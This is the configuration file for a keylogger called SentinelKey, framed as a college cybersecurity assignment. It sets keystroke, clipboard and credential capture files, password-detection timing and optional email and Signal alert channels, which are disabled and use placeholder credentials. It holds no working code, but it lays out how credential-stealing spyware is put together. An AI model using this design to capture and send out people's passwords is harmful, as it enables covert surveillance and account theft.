# SentinelKey — Configuration
# College cybersecurity assignment — run only on systems you own.

# ── Start / Stop ──────────────────────────────────────────────────────────────
# False = start logging the instant the program runs (default, best for demos)
# True  = wait for ESC key before beginning capture
START_ON_ESC = False
STOP_KEY = "esc"          # key that stops the logger when not in ESC-start mode

# ── Output files ─────────────────────────────────────────────────────────────
KEYLOG_FILE    = "keylog_output.txt"          # Part 1  — all keys + mouse
PASSWORDS_FILE = "passwords_captured.txt"     # Part 2  — credentials only
CLIPBOARD_FILE = "clipboard_log.txt"          # clipboard history

# ── Password-detection timing ────────────────────────────────────────────────
TAB_PASSWORD_DELAY    = 2.0   # seconds: Tab → start-of-password
ENTER_PASSWORD_WINDOW = 3.0   # seconds: clipboard change → Enter = password submit

# ── Email notifications ───────────────────────────────────────────────────────
EMAIL_ENABLED    = False
SMTP_SERVER      = "smtp.gmail.com"
SMTP_PORT        = 587
SMTP_USE_TLS     = True
SENDER_EMAIL     = "your_email@gmail.com"
SENDER_PASSWORD  = "your_app_password"   # Gmail App Password (not account password)
RECIPIENT_EMAIL  = "alert_recipient@example.com"

# ── Signal notifications (requires signal-cli) ────────────────────────────────
SIGNAL_ENABLED = False
SIGNAL_PHONE   = "+1234567890"           # your registered Signal number

# ── GUI ───────────────────────────────────────────────────────────────────────
USE_GUI = True   # falls back to console automatically if tkinter is unavailable
